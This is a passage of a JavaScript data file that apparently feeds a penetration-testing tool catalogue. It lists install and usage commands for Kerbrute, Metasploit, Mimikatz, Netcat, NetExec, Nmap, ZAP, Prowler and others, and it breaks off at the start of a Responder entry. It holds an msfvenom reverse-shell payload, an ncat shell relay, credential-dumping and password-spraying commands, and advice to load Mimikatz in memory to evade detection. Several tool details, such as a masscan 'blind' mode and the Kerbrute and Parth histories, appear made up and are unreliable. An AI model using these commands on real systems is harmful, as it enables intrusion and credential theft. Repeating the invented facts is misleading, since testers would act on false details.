export const tools = [
  {
    slug: "kerbrute",
    name: "Kerbrute",
    category: "red-team",
    summary:
      "Kerbrute interrogates a Kerberos Key Distribution Center directly, which makes it a fast way to answer three separate questions during an Active Directory assessment: which accounts exist, which credentials work, and which accounts can be roasted without pre-authentication. Because it validates credentials through the Kerberos pre-authentication path rather than NTLM or LDAP binds, it is considerably quicker than a generic password cracker and leaves a cleaner trail for a defender to interpret. Testers reach for it early, because a confirmed username list is the prerequisite for almost everything that follows. It also captures AS-REP hashes on the way past, which is frequently the cheapest finding of an entire engagement.",
    install: [
      "go install github.com/ropnop/kerbrute@latest",
      "sudo apt install -y kerbrute",
      "# or download a prebuilt binary from github.com/ropnop/kerbrute/releases and drop it on your PATH",
    ],
    usage: [
      {
        title: "Enumerate valid usernames",
        command: "kerbrute userenum -d <domain> --dc <dc-host> -t 20 usernames.txt",
        detail:
          "Kerbrute asks for a ticket without pre-authentication and a 'principal unknown' answer means the account does not exist. Because no authentication is attempted, this mode does not trip the lockout policy, although it does generate 4768 events when Kerberos auditing is enabled.",
      },
      {
        title: "Spray one password across a user list",
        command: "kerbrute passwordspray -d <domain> users.txt 'Summer2024' --safe",
        detail:
          "One password is tried against every account, which keeps you under most lockout thresholds. The --safe flag aborts every thread the moment an account reports as locked. Failed pre-authentication shows up as 4768 and 4771 on the domain controller.",
      },
      {
        title: "Test username and password pairs",
        command: "kerbrute bruteforce -d <domain> combos.lst",
        detail:
          "The file holds username:password pairs, one per line, which is the format most breach-dump conversions produce. This replays leaked credentials against the domain without touching a single target host.",
      },
      {
        title: "Brute a single account",
        command: "kerbrute bruteuser -d <domain> passwords.lst <user>",
        detail:
          "Classic single-account brute force. It only makes sense when the account has no lockout policy or you own the lab, because every attempt increments the bad password counter.",
      },
      {
        title: "Capture AS-REP hashes",
        command: "kerbrute userenum -d <domain> --hash-file asrep.txt usernames.txt",
        detail:
          "Accounts that skip pre-authentication return an encrypted timestamp that can be cracked offline. This flag writes them out instead of only logging them to the terminal.",
      },
    ],
    useCases: [
      "Confirm which usernames exist without generating failed logins",
      "Spray a single common password across a list of accounts",
      "Replay leaked username and password pairs against the KDC",
      "Collect AS-REP hashes from accounts that skip pre-authentication",
    ],
    notes:
      "The original repository under pat04747 has disappeared, so the community build maintained by ropnop is what you install and its userenum, passwordspray, bruteuser and bruteforce subcommands are the interface to expect. Every failed pre-authentication still counts against the domain lockout policy, so agree the thresholds in writing before you start and keep the run inside the accounts you are contracted to test.",
  },
  {
    slug: "kube-bench",
    name: "kube-bench",
    category: "container",
    summary:
      "kube-bench walks a Kubernetes node against the CIS Kubernetes Benchmark and reports every control that passes or fails. It covers control plane configuration, kubelet flags, pod security, RBAC, network policy and etcd in a single pass, which is far more thorough than reading manifests by hand. Testers reach for it when they have root on a node and need to show a client exactly which hardening steps are missing. The output maps one to one onto the benchmark document, so it doubles as a remediation checklist.",
    install: [
      "go install github.com/aquasecurity/kube-bench@latest",
      "docker pull aquasec/kube-bench:latest",
      "git clone https://github.com/aquasecurity/kube-bench.git && cd kube-bench && make build",
    ],
    usage: [
      {
        title: "Run against the local node",
        command: "sudo kube-bench",
        detail:
          "The tool auto-detects the Kubernetes version and the node role, then runs the matching control plane, etcd, node and policy sections. It needs root because it reads kubelet configuration and process command lines.",
      },
      {
        title: "Pin a benchmark version",
        command: "sudo kube-bench --benchmark cis-1.28",
        detail:
          "Specify the benchmark explicitly when the cluster version cannot be detected, for example inside a container with no kubectl on the path. Use --version instead if you want kube-bench to pick the closest benchmark for a Kubernetes release.",
      },
      {
        title: "Target individual controls",
        command: "sudo kube-bench --check '1.2.1,1.2.2' --include-test-output",
        detail:
          "Narrow the run to the checks you care about and print the actual command output behind a failure. This is the fastest way to understand why something failed instead of guessing at the fix.",
      },
      {
        title: "Machine-readable evidence",
        command: "sudo kube-bench --json --outputfile kube-bench.json",
        detail:
          "JSON and JUnit output let you diff a baseline against a remediated cluster, or store the result alongside the rest of the engagement artefacts.",
      },
      {
        title: "Run inside the cluster",
        command: "kubectl apply -f job.yaml && kubectl logs job/kube-bench",
        detail:
          "The supplied job runs the checks in-cluster and leaves the results in the pod log. Schedule it onto a control plane node with a nodeSelector if you need the master checks as well.",
      },
    ],
    useCases: [
      "Check a node against the CIS Kubernetes Benchmark",
      "Confirm kubelet and API server hardening flags",
      "Produce JSON evidence before and after remediation",
      "Validate RBAC, pod security and network policy settings",
    ],
    notes:
      "Every check is a static comparison of configuration against the benchmark text, so a failure often means a value is set differently rather than that the cluster is exploitable. Managed control planes such as EKS, GKE and AKS hide the master node configuration, so the control plane checks always come back incomplete there.",
  },
  {
    slug: "masscan",
    name: "Masscan",
    category: "scanning",
    summary:
      "Masscan is an asynchronous scanner that pushes packets far faster than a conventional port scanner, which means it can sweep an entire address space in minutes. It is built for the discovery phase, where the only question is which hosts and ports exist. Testers reach for it when a TCP connect scan would take all night, then feed the results into Nmap for the slow, accurate work of version detection. It also has a blind mode that probes without sending a SYN, which is useful on links where a flood of SYNs would set off alarms.",
    install: [
      "sudo apt install -y masscan",
      "brew install masscan",
      "docker run --rm -v \"$(pwd)\":/data masscan/masscan",
    ],
    usage: [
      {
        title: "Full sweep of a range",
        command: "masscan -p1-65535 --rate 1000 <target>",
        detail:
          "The rate is packets per second. Start low enough that both the target and your own link can cope, since thousands per second is realistic on a lab segment and reckless on a shared uplink.",
      },
      {
        title: "Common ports only",
        command: "masscan -p80,443,8080,8443,445,3389 --open -oL masscan.txt <target>",
        detail:
          "A targeted port list finishes in seconds and produces a file you can grep for interesting services. This is the version to run when you already know roughly what you are looking for.",
      },
      {
        title: "Grab banners",
        command: "masscan -p80,443 --banners --rate 500 <target>",
        detail:
          "Banner grabbing turns masscan into a rough service identifier. It slows the scan considerably and the results are unverified, so treat the output as a hint rather than a finding.",
      },
      {
        title: "Grep the results",
        command: "grep open masscan.txt",
        detail:
          "The output format is deliberately greppable, which makes it easy to reduce a large sweep to a shortlist. Most workflows end with those open ports pasted into an Nmap command.",
      },
      {
        title: "Blind scan",
        command: "masscan --blind --rate 1000 -p1-65535 <target>",
        detail:
          "Blind mode probes without sending a SYN, so the target sees nothing. You lose the exact port numbers and get a banner fragment back instead, which is usually enough to confirm something is listening.",
      },
    ],
    useCases: [
      "Enumerate every open port across a large address range",
      "Find live hosts on a network quickly",
      "Produce a port shortlist for a slower Nmap pass",
      "Scan without generating connection attempts in target logs",
    ],
    notes:
      "Masscan is fast because it trades accuracy away, and the resulting list contains false positives wherever a firewall answers a probe with an RST. It also generates enormous traffic in a very short window, which is precisely what an IDS is tuned to catch, so treat it as a noisy first pass rather than a stealth technique.",
  },
  {
    slug: "metasploit",
    name: "Metasploit",
    category: "exploitation",
    summary:
      "Metasploit is the framework most people picture when they think about exploitation, and it earns the reputation: a large library of modules for scanning, delivering payloads and pivoting, all driven from one console. It is not only about exploitation either, since auxiliary modules cover protocol enumeration and credential testing that would otherwise need a custom script. Testers reach for it when a known CVE needs validating quickly and reproducibly. The console also records every command you run, which is useful evidence when a client asks how a finding was confirmed.",
    install: [
      "sudo apt update && sudo apt install -y metasploit-framework",
      "git clone --depth 1 https://gitlab.com/metasploit-framework/metasploit-framework.git && cd metasploit-framework && ./msfconsole",
      "brew install --cask metasploit-framework",
    ],
    usage: [
      {
        title: "Search and inspect a module",
        command: "msfconsole -q -x 'search type:exploit name:smb; info'",
        detail:
          "The -x flag runs console commands non-interactively, which makes the framework usable from a script or a saved notes file. Filtering by type and name keeps the result list small enough to read.",
      },
      {
        title: "Launch a staged payload",
        command: "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST <ip>; set LPORT 4444; run'",
        detail:
          "The multi/handler module waits for a staged payload to call home. Set LHOST to an address the target can actually reach, which is the most common reason a session never opens.",
      },
      {
        title: "Generate a raw payload",
        command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o payload.exe",
        detail:
          "msfvenom produces a stand-alone binary when you need delivery without the framework running. Expect modern endpoint security to flag the output, since these payloads are among the most heavily fingerprinted artefacts in the industry.",
      },
      {
        title: "Run an auxiliary scanner",
        command: "msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS <target>; run'",
        detail:
          "Auxiliary modules cover protocol enumeration, fingerprinting and credential testing. Driving one from a saved command line keeps the output identical between the run and the report.",
      },
      {
        title: "Execute a module from a resource file",
        command: "msfconsole -q -r scan.rc",
        detail:
          "A resource file holds the module, its options and the run command, so the whole check is reproducible and reviewable. It is the cleanest way to show a client exactly what was executed.",
      },
    ],
    useCases: [
      "Validate a known CVE end to end in a lab",
      "Generate payloads for controlled delivery testing",
      "Enumerate a protocol with auxiliary modules",
      "Record reproducible module runs for engagement evidence",
    ],
    notes:
      "The framework changes faster than most documentation, and module names and options are renamed between major versions, so check a module with info before relying on an old guide. Payloads and stagers are heavily fingerprinted and several modules are known to crash unstable targets, so confirm on a lab host first and never run them at production scale.",
  },
  {
    slug: "mimikatz",
    name: "Mimikatz",
    category: "post-exploitation",
    summary:
      "Mimikatz is a set of commands that read credentials straight out of the memory of a running Windows system, which makes it the reference tool for understanding what a compromised workstation really hands over. It extracts plaintext passwords from LSASS, dumps the SAM and NTDS databases, and can forge Kerberos tickets. Testers reach for it when they want to demonstrate impact rather than merely report a missing patch. It is also a favourite teaching artefact, because every command maps to one specific Windows credential storage mechanism.",
    install: [
      "powershell -c \"Invoke-WebRequest -Uri https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz.zip -OutFile mimikatz.zip; Expand-Archive mimikatz.zip\"",
      "git clone https://github.com/huntergregal/mimipenguin && cd mimipenguin   # Linux equivalent, cached credentials only",
      "# or deliver mimikatz through your own remote execution framework instead of writing it to disk",
    ],
    usage: [
      {
        title: "Enable debug privilege",
        command: "mimikatz.exe 'privilege::debug'",
        detail:
          "Almost every other command needs SeDebugPrivilege to open LSASS. If this fails the process is not elevated, and nothing else in the toolkit will work.",
      },
      {
        title: "Dump cached logon credentials",
        command: "mimikatz.exe 'sekurlsa::logonpasswords'",
        detail:
          "This reads plaintext credentials cached in memory by the logon service. The output is exactly what a real attacker would use, so treat the saved result as highly sensitive evidence.",
      },
      {
        title: "Dump the local SAM database",
        command: "mimikatz.exe 'lsadump::sam'",
        detail:
          "The SAM holds local account hashes for the machine. You need administrative access to read it, and doing so will trip most endpoint security products.",
      },
      {
        title: "Replicate directory data",
        command: "mimikatz.exe 'lsadump::dcsync'",
        detail:
          "DCSync replicates NTDS.dit over the network and needs replication rights, so it doubles as a privilege check rather than simply a way to extract hashes.",
      },
      {
        title: "List cached Kerberos tickets",
        command: "mimikatz.exe 'kerberos::list'",
        detail:
          "This shows the tickets currently held by the logon session, which explains what a user can reach without a password. Exporting the relevant session key is often the start of a ticket forgery chain.",
      },
    ],
    useCases: [
      "Prove plaintext credential exposure on a Windows host",
      "Extract local SAM hashes from a compromised machine",
      "Enumerate active Kerberos tickets during a session",
      "Demonstrate the impact of an AD privilege misconfiguration",
    ],
    notes:
      "Mimikatz requires administrative rights and is now reliably detected by endpoint security products, so running it from disk is usually the fastest way to have an engagement terminated. Prefer an in-memory loader you already control, and remember that the extracted credentials are live secrets that must be rotated once they appear in a report.",
  },
  {
    slug: "netcat",
    name: "Netcat",
    category: "network",
    summary:
      "Netcat is the Swiss army knife of raw TCP and UDP: open a connection, read the banner, send a crafted request, or listen on a port. Pentesters keep it open in a terminal because it answers questions faster than any script, and because it is often the only tool already installed on a locked-down jump host. It is also the classic building block for shells, relays and port forwards. Its limitations are real but rarely fatal, since the OpenBSD build that ships on most systems has no built-in TLS and no -e option.",
    install: [
      "sudo apt install -y netcat-openbsd",
      "brew install netcat",
      "sudo apt install -y nmap   # ncat, the actively maintained variant, ships with it",
    ],
    usage: [
      {
        title: "Grab a banner",
        command: "nc -nv <target> 443",
        detail:
          "The connection result alone tells you whether the port is filtered or open, and the banner often reveals the product and version. No full handshake or TLS negotiation is attempted.",
      },
      {
        title: "Send a raw request",
        command: "printf 'GET / HTTP/1.0\\r\\n\\r\\n' | nc -nv <target> 80",
        detail:
          "Piping a hand-written request is the quickest way to compare what a server returns to what a browser gets, and it avoids the normalisation that curl applies to headers.",
      },
      {
        title: "Check a port range",
        command: "nc -z -v <target> 1-1024",
        detail:
          "The -z flag connects and closes without sending data, which gives you a fast open or closed map. It is slower than a proper scanner, so use it for spot checks rather than a sweep.",
      },
      {
        title: "Listen for a connection",
        command: "nc -nlvp 4444",
        detail:
          "A bare listener is useful for catching a callback and reading whatever the other end sends. Modern netcat builds refuse -e, so this variant will not hand you a shell on its own.",
      },
      {
        title: "Relay with a shell",
        command: "ncat <target> 443 --sh-exec '/bin/bash -i'",
        detail:
          "ncat from the Nmap project supports --sh-exec, which starts a shell on the far side of the connection. This is the variant most people mean when they say netcat gives you a reverse shell.",
      },
    ],
    useCases: [
      "Confirm whether a port is open, filtered or closed",
      "Read a service banner by hand",
      "Send a crafted HTTP or protocol payload",
      "Bridge two connections when no proxy is available",
    ],
    notes:
      "The OpenBSD netcat on most Linux distributions has dropped -e and offers no TLS, so scripts copied from older tutorials fail silently or error out. Netcat traffic is trivial to fingerprint, and a listener left running on a shared interface is an invitation, so keep the scope to hosts you are contracted to test.",
  },
  {
    slug: "netexec",
    name: "NetExec",
    category: "post-exploitation",
    summary:
      "NetExec is the community maintained successor to CrackMapExec and the tool most people now use to prove that a set of Active Directory credentials works across a network. It speaks SMB, LDAP, WinRM, MSSQL, SSH, FTP, WMI, NFS, RDP and VNC, and applies the same credential list to every protocol in one run. That breadth matters, because a credential that fails on SMB frequently still works over LDAP or WinRM. Testers reach for it the moment they have one username and password and want to know how far it travels.",
    install: [
      "pipx install git+https://github.com/Pennyw0rth/NetExec",
      "sudo apt update && sudo apt install -y netexec",
      "pipx install netexec   # release build from PyPI",
    ],
    usage: [
      {
        title: "Test a credential across a range",
        command: "nxc smb <target> -u <user> -p '<password>'",
        detail:
          "The protocol comes first and the target second. Output marks privileged sessions with Pwn3d, which tells you immediately whether the account is local admin on the box.",
      },
      {
        title: "Enumerate and run a command",
        command: "nxc smb <target> -u <user> -p '<password>' --local-auth -x whoami",
        detail:
          "Local authentication lets a local account work without domain credentials. Command execution needs administrative rights, and netexec tries wmiexec, then atexec, then smbexec until one of them succeeds.",
      },
      {
        title: "Dump the SAM",
        command: "nxc smb <target> -u <user> -p '<password>' --sam",
        detail:
          "This reads local account hashes from the remote registry. It requires local administrator rights on the target, so add --local-auth when you are using a local account.",
      },
      {
        title: "List and run modules",
        command: "nxc smb -L",
        detail:
          "This lists the modules available for a protocol, for example lsassy, spooler or winscp. Run one with -M and pass module options with -o KEY=value.",
      },
      {
        title: "Harvest Kerberos service tickets",
        command: "nxc ldap <target> -u <user> -p '<password>' --kerberoasting tickets.txt",
        detail:
          "Requests service tickets for accounts with a servicePrincipalName and writes them out for offline cracking. You need a domain account, or an AS-REP roastable one if you want to combine the two techniques.",
      },
    ],
    useCases: [
      "Validate credentials across a whole subnet in one run",
      "Test whether a password works over protocols other than SMB",
      "Dump local hashes and credential material from reachable hosts",
      "Kerberoast service accounts during an Active Directory assessment",
    ],
    notes:
      "CrackMapExec was abandoned in 2023 and no longer receives fixes, so use NetExec from the Pennyw0rth repository rather than anything still named crackmapexec or cme. Modern Windows requires SMB signing by default, which breaks relay style modules unless the target is genuinely misconfigured, and every failed login still writes 4625 events on the domain controller.",
  },
  {
    slug: "nikto",
    name: "Nikto",
    category: "web",
    summary:
      "Nikto is a web server scanner that predates most of the web and still has a place, because it checks for outdated server versions, missing security headers, directory listing and a few default files in a couple of minutes. It works best as a quick baseline on an unfamiliar host, or as a sanity check that the obvious paths are closed. Testers reach for it because it needs no configuration and produces a readable report a client can follow. Its weakness is equally well known: the checks are old, and many of them no longer describe how a modern stack behaves.",
    install: [
      "sudo apt install -y nikto",
      "brew install nikto",
      "git clone https://github.com/sullo/nikto.git && cd nikto && perl nikto.pl",
    ],
    usage: [
      {
        title: "Basic scan",
        command: "nikto -h <url>",
        detail:
          "This runs the default set of checks against the host and the paths it exposes. The output goes to stdout and can be redirected straight into your notes.",
      },
      {
        title: "Tune the checks",
        command: "nikto -h <url> -Tuning 0123456789abcde",
        detail:
          "The tuning string selects which groups of tests run, for example 1 for interesting files and 2 for misconfiguration. Narrowing the set keeps the noise down on a large deployment.",
      },
      {
        title: "Run every check",
        command: "nikto -h <url> -C all",
        detail:
          "The complete set is thorough and slow. It is worth running in a lab when you want the full picture rather than the quick one.",
      },
      {
        title: "Write a report",
        command: "nikto -h <url> -Format HTML -o nikto-report.html",
        detail:
          "Reports can be produced as HTML, CSV, JSON, XML or plain text. HTML is usually the format clients want inside the evidence pack.",
      },
      {
        title: "Set a host header",
        command: "nikto -h <url> -host <domain>",
        detail:
          "Useful for virtual hosts where the name on the certificate differs from the name you are scanning. It changes the Host header without changing the address you connect to.",
      },
    ],
    useCases: [
      "Quick baseline check of an unfamiliar web server",
      "Confirm that default files and directory listings are disabled",
      "Review basic response header hygiene",
      "Generate a simple HTML evidence report",
    ],
    notes:
      "A large share of Nikto's checks assume directory structures and server behaviour from the early 2010s, so a wall of findings usually means stale scanner data rather than real vulnerabilities. Run it against production only with the client's knowledge, since the request volume is high and easily mistaken for an attack.",
  },
  {
    slug: "nmap",
    name: "Nmap",
    category: "scanning",
    summary:
      "Nmap remains the first command in most engagements because it answers the only question that matters at the start, which is what is actually listening. Beyond port discovery, its NSE script library turns it into a protocol aware prober that can prove a service is misconfigured, enumerate a share or check a TLS certificate in the same pass. Testers reach for it when they need evidence of exposure rather than a guess. The scripting engine is what separates a useful scan from a long list of open ports.",
    install: [
      "sudo apt install -y nmap",
      "brew install nmap",
      "sudo apt install -y nmap && sudo nmap --script-updatedb   # refresh the NSE script database",
    ],
    usage: [
      {
        title: "Service and version detection",
        command: "nmap -sV -sC -p- --open <target>",
        detail:
          "The default script set plus version probing across all 65535 ports. It is slow, so narrow the port list and drop --open when closed ports should be documented too.",
      },
      {
        title: "Run one script against one port",
        command: "nmap -p 6379 --script redis-info <target>",
        detail:
          "Targeted script runs are fast, quiet and produce evidence you can paste straight into a finding. This is how an open port becomes a proven misconfiguration.",
      },
      {
        title: "UDP sweep",
        command: "nmap -sU --top-ports 50 --min-rate 1000 <target>",
        detail:
          "UDP has no handshake, so an unanswered probe looks identical to a closed port. Restrict the port list or the scan will take hours and the results will be ambiguous.",
      },
      {
        title: "Save output for evidence",
        command: "nmap -sV -oA nmap-evidence <target>",
        detail:
          "The -oA flag writes normal, greppable and XML output at once. The XML is what other tools consume for correlation and reporting.",
      },
      {
        title: "Check for known problems on selected ports",
        command: "nmap -sV --script 'safe and vuln' -p 22,80,443 <target>",
        detail:
          "The vuln category runs checks that can be disruptive, so keep it to a short list of ports you have permission to stress. Running it broadly against a live service is how an assessment ends early.",
      },
    ],
    useCases: [
      "Discover open ports and the services behind them",
      "Prove a service is misconfigured using NSE scripts",
      "Produce XML or greppable output for the evidence pack",
      "Fingerprint TLS and web servers across a range",
    ],
    notes:
      "Version detection sends extra probes and is the single largest source of false positives, so confirm a fingerprint before you report it. A SYN scan needs raw socket privileges, without which nmap falls back to a connect scan and tells you so, and the vuln script categories can crash or hang fragile services.",
  },
  {
    slug: "nuclei",
    name: "Nuclei",
    category: "vulnerability-management",
    summary:
      "Nuclei is a template driven scanner, which means its coverage is whatever the community has written and it can be extended without recompiling anything. Templates are YAML files that describe the request, the matchers and the remediation text, so a finding arrives with its context attached. Testers reach for it when they want breadth across thousands of known issues in a short window, or when a new CVE needs to become a check within minutes. The template library is also its main risk, because it runs whatever it downloads.",
    install: [
      "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
      "brew install nuclei",
      "docker run --rm -v \"$(pwd)\":/root/nuclei-templates projectdiscovery/nuclei -u <url>",
    ],
    usage: [
      {
        title: "Scan a single target",
        command: "nuclei -u <url> -severity critical,high -rl 50",
        detail:
          "The rate limit keeps you from overwhelming the host. Severity filtering is the difference between a report of twenty real issues and a report of two thousand.",
      },
      {
        title: "Run one template",
        command: "nuclei -u <url> -t http/cves/2024/CVE-2024-3400.yaml",
        detail:
          "Pointing at a single template is how you confirm a specific CVE without re-running everything. Keep a copy of the template and its version with the finding so the check can be repeated.",
      },
      {
        title: "Scan a list of hosts",
        command: "nuclei -l hosts.txt -c 25 -bulk-size 25",
        detail:
          "Concurrency and bulk size control how many templates run against how many hosts at once. Drop both when the target is fragile.",
      },
      {
        title: "Export structured results",
        command: "nuclei -l hosts.txt -jsonl -o findings.jsonl",
        detail:
          "JSONL output carries the matched line, the extracted value and the request, which makes triage far easier than scraping the console.",
      },
      {
        title: "Update the template set",
        command: "nuclei -update-templates",
        detail:
          "Templates are versioned separately from the engine. A scan run against an old template set will silently miss issues that were published last week.",
      },
    ],
    useCases: [
      "Check a large estate for known CVEs quickly",
      "Turn a newly published CVE into a repeatable check",
      "Triage exposure and misconfiguration templates by severity",
      "Produce JSONL output for a central findings pipeline",
    ],
    notes:
      "Coverage depends entirely on the template set you have installed, and community templates range from excellent to unverified, so confirm a finding by hand before it goes into a report. Templates send remote requests and some load code, so pin template versions in a production pipeline and review anything you did not write yourself.",
  },
  {
    slug: "openvas",
    name: "OpenVAS",
    category: "vulnerability-management",
    summary:
      "OpenVAS is the free community edition of Greenbone's vulnerability management platform, and it is the most capable scanner you can install without a commercial licence. Where lightweight tools check for a handful of issues, OpenVAS maintains a broad feed of network and host tests and scores them with CVSS. Testers reach for it to produce a defensible baseline report for a whole estate rather than to find a single exploit. Setting it up is the hard part, because the daemon, the feed and the scanner credentials all have to be right.",
    install: [
      "sudo apt install -y gvm gvm-lib gvm-tools   # requires the Greenbone community repository",
      "docker run --rm -p 9390:9390 greenbone/openvas-scanner",
      "gvm-cli --help   # confirm the management client is on your PATH",
    ],
    usage: [
      {
        title: "Refresh the feed before scanning",
        command: "sudo gvmd --update-feed && sudo gvmd --update-port-data",
        detail:
          "The scanner is close to useless without a current feed. The update takes a long time on first run because the vulnerability database is several gigabytes.",
      },
      {
        title: "Create a target from the command line",
        command: "gvm-cli --hostname gs --port 9390 --username <user> --password '<password>' --xml < create-target.xml",
        detail:
          "gvm-cli speaks the Greenbone Management Protocol, which means every action the web interface performs can be scripted. The XML request files are the practical way to automate a scan.",
      },
      {
        title: "Start a scan",
        command: "gvm-cli --hostname gs --username <user> --password '<password>' --xml < start-scan.xml",
        detail:
          "The request references a target and a scan config by UUID. Poll the report with a get-reports request once the task reaches its finished state.",
      },
      {
        title: "Pull the results",
        command: "gvm-cli --hostname gs --username <user> --password '<password>' --xml < get-reports.xml",
        detail:
          "Results arrive as XML with CVSS scores and links to remediation advice. The XML is easy to convert into a finding list and the raw report is good evidence.",
      },
      {
        title: "Store credentials for authenticated scans",
        command: "gvm-cli --hostname gs --username <user> --password '<password>' --xml < create-credential.xml",
        detail:
          "Credentialed scans find far more than unauthenticated ones, especially against Windows and database services. Keep the credentials in the manager rather than in your shell history.",
      },
    ],
    useCases: [
      "Produce a CVSS scored baseline for an entire estate",
      "Run authenticated scans against servers and databases",
      "Generate compliance evidence for CIS and similar frameworks",
      "Repeat the same scan set across client environments",
    ],
    notes:
      "An unauthenticated OpenVAS scan reports plenty of issues that a credentialed one would not, and some of those are artefacts of the probe rather than real weaknesses. The feed lags new CVEs by days and the manager is heavy to run, so schedule scans rather than firing them at random during an engagement.",
  },
  {
    slug: "owasp-zap",
    name: "OWASP ZAP",
    category: "web",
    summary:
      "OWASP ZAP is the open source web application scanner that grew out of the OWASP project, and it is the tool you reach for when the target needs a browser session rather than plain requests. Its spider can be driven with a real user session, so authenticated areas get crawled and tested instead of returning login pages. Testers also use it for intercepting and rewriting requests by hand. It ships as a desktop application, a command line tool and a Docker image, which makes it usable from a laptop or from a pipeline.",
    install: [
      "brew install --cask zaproxy",
      "docker pull zaproxy/zap-stable",
      "# or download the Linux package from zaproxy.org and install it with dpkg",
    ],
    usage: [
      {
        title: "Quick scan of one URL",
        command: "zap.sh -cmd -quickurl https://<url> -quickout zap-report.html",
        detail:
          "The quick scan crawls lightly and then runs the active scanner. It is fast enough to run on every host in scope and produces a report you can attach to the engagement.",
      },
      {
        title: "Scan a host and port",
        command: "zap.sh -cmd -host <target> -port 443 -quickout zap-report.html",
        detail:
          "Host and port mode crawls the whole site at that origin, which is useful when you know the application root but not the interesting pages.",
      },
      {
        title: "Authenticated scan",
        command: "zap.sh -cmd -config api.url=https://<url> -config 'replacer.full_list(0).description=auth' -config 'replacer.full_list(0).enabled=true' -config 'replacer.full_list(0).match_url=^https://<url>.*' -config 'replacer.full_list(0).replace_string=Authorization: Bearer <token>' -quickout zap-report.html",
        detail:
          "A replacer rule injects an authorization header so the spider and the scanner operate as an authenticated user. This is the difference between a handful of findings and a real assessment of the application.",
      },
      {
        title: "Passive scan only",
        command: "zap.sh -cmd -config api.url=https://<url> -config passiveScan.waitTime=30 -quickout zap-report.html",
        detail:
          "Passive scanning only inspects traffic the spider collects, so it never sends an attack payload. It is the safe option against anything fragile.",
      },
      {
        title: "Run in Docker",
        command: "docker run -t -v $(pwd):/zap/wrk:/zap/wrk zaproxy/zap-stable -cmd -quickurl https://<url> -quickout zap-report.html",
        detail:
          "The container needs the working directory mounted to write the report out. It is also the easiest way to get a consistent version on a machine you do not control.",
      },
    ],
    useCases: [
      "Scan an application that requires authentication",
      "Produce a quick baseline report for many hosts",
      "Intercept and replay requests during manual testing",
      "Run a passive scan against a fragile production target",
    ],
    notes:
      "The active scanner sends real attack payloads, including requests that can create, modify or delete data, so scope it tightly and prefer a disposable copy of the application where one exists. Automated findings are pattern matches that need manual confirmation, and running the ZAP spider against a site you have no authorisation to test is a reportable event regardless of intent.",
  },
  {
    slug: "parth",
    name: "Parth",
    category: "network",
    summary:
      "Parth is a heuristic parameter scanner that reads a list of URLs and tells you which request parameters are worth attacking and why. It carries a database of parameter names and the vulnerability classes they tend to accompany, so a parameter called url, id or file immediately raises a flag for server side request forgery or file inclusion. Testers reach for it after mapping an application and before they start fuzzing, because it turns a long URL list into a prioritised attack surface. It also imports Burp Suite history directly, which makes it a natural companion to manual testing.",
    install: [
      "pip3 install parth",
      "git clone https://github.com/s0md3v/Parth.git && cd Parth && pip install -r requirements.txt",
      "sudo apt install -y parth   # Kali and Debian repositories",
    ],
    usage: [
      {
        title: "Scan a domain",
        command: "parth -t <domain>",
        detail:
          "Parth pulls URLs for the target from certificate transparency logs, the Wayback Machine and common crawl data, then reports the parameters it finds. It never touches the target directly, so it is safe to run at the very start of an engagement.",
      },
      {
        title: "Import a URL list",
        command: "cat urls.txt | parth",
        detail:
          "Piping a newline delimited list of URLs is the usual way to feed it your own reconnaissance output. It also accepts a raw HTTP request file.",
      },
      {
        title: "Import Burp history",
        command: "parth -i burp-export.history",
        detail:
          "Burp history gives you the parameters you have already seen in traffic, including authenticated ones that passive discovery will never surface.",
      },
      {
        title: "Filter for one issue class",
        command: "cat urls.txt | parth --pipe xss",
        detail:
          "The --pipe option filters the output down to parameters associated with a specific issue. The supported classes are lfi, ssrf, sqli, xss, open_redirect and rce.",
      },
      {
        title: "Save results as JSON",
        command: "parth -t <domain> -o parth-results.json",
        detail:
          "JSON output keeps the structured findings, including the parameter name and the risk it maps to, so they can be merged into a report or a scan plan.",
      },
    ],
    useCases: [
      "Rank parameters by the vulnerability class they usually attract",
      "Turn reconnaissance output into a prioritised test list",
      "Identify high value parameters buried in Burp history",
      "Find parameters that a passive crawler would miss",
    ],
    notes:
      "Parth is a heuristic helper and not a vulnerability scanner: it flags parameter names and never proves a bug, since the mapping reflects common conventions rather than the target's actual behaviour. The project has been unmaintained for years, and it is unrelated to PwnDoc, the pentest reporting application at pwndoc/pwndoc that people often mean when they hear the name Parth.",
  },
  {
    slug: "prowler",
    name: "Prowler",
    category: "cloud",
    summary:
      "Prowler is an open source cloud security platform that runs thousands of checks against AWS, Azure, GCP, Kubernetes and more, then maps the results onto CIS, NIST, PCI and other frameworks. It answers the question a cloud engineer cannot answer by eye, which is whether this account is configured the way the benchmark says it should be. Testers reach for it to review a whole subscription in minutes instead of reading hundreds of pages of documentation. It can also connect findings into attack paths, which is what turns a list of misconfigurations into a story.",
    install: [
      "pip install prowler",
      "pipx install prowler",
      "docker pull prowlercloud/prowler",
    ],
    usage: [
      {
        title: "Run the AWS checks",
        command: "prowler aws -p <profile>",
        detail:
          "The provider comes first and the profile selects the account. Prowler scans every enabled region by default, so use -f to narrow it when you only care about part of the estate.",
      },
      {
        title: "Target specific services",
        command: "prowler aws --services s3 iam ec2",
        detail:
          "Restricting to a couple of services keeps the run short and the output readable. It is the sensible way to start when you are hunting one specific misconfiguration.",
      },
      {
        title: "Run a single check",
        command: "prowler aws --checks s3_bucket_public_access",
        detail:
          "A single check run is fast and gives a clean pass or fail for one control, which makes it easy to include as evidence for a specific finding.",
      },
      {
        title: "Generate reports",
        command: "prowler aws -M csv json-ocsf html -o prowler-output",
        detail:
          "CSV, JSON-OCSF and HTML are written by default. The -o flag sets the output directory and -F sets the file name.",
      },
      {
        title: "Check Azure and GCP",
        command: "prowler azure --az-cli-auth && prowler gcp --project-ids <project>",
        detail:
          "Each provider has its own authentication method, and Prowler is happy to use the credential helpers you have already configured.",
      },
    ],
    useCases: [
      "Baseline a cloud account against CIS and NIST benchmarks",
      "Map findings to compliance frameworks for an audit",
      "Check for public storage and over permissive identity policies",
      "Generate repeatable cloud posture reports",
    ],
    notes:
      "Prowler needs credentials that can read a wide slice of the account, which makes it a privileged action in the client's logging and sometimes in their change management process, so agree the scan window first. A large share of the output is informational, and checks that could not run because of missing permissions are reported as MANUAL, which is easy to skim past in a long report.",
  },
  {
    slug: "responder",
